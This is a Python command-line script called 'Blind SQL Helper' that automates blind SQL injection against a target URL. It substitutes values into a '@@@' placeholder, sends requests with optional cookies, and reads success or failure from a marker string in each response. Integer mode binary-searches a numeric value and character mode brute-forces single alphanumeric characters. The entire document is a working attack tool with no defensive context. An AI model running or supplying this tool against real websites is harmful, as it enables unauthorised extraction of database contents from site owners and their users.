import argparse
import json
import requests

parser = argparse.ArgumentParser(description='Blind SQL Helper')
parser.add_argument('--mode', choices=['integer', 'character'], default='character')
parser.add_argument('--min', default=0, type=int)
parser.add_argument('--max', default=255, type=int)
parser.add_argument('--debug', action='store_true')
parser.add_argument('--cookies', type=json.loads)
parser.add_argument('--url', required=True)
parser.add_argument('--detect', required=True)

args = parser.parse_args()

if args.mode == 'integer':
	now_min = args.min
	now_max = args.max

	while now_min <= now_max:
		t = (now_min + now_max) >> 1
		temp_url = args.url.replace('@@@', str(t))
		r = requests.get(temp_url, cookies=args.cookies)
		if args.debug:
			print(r.text)
		if args.detect in r.text:
			print('%d success' % t)
			now_min = t + 1
		else:
			print('%d fail' % t)
			now_max = t - 1
	print(now_min - 1)
elif args.mode == 'character':
	key = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
	for c in key:
		temp_url = args.url.replace('@@@', c)
		r = requests.get(temp_url, cookies=args.cookies)
		if args.debug:
			print(r.text)
		if args.detect in r.text:
			print(c)
			break
		else:
			print('%c fail' % c)
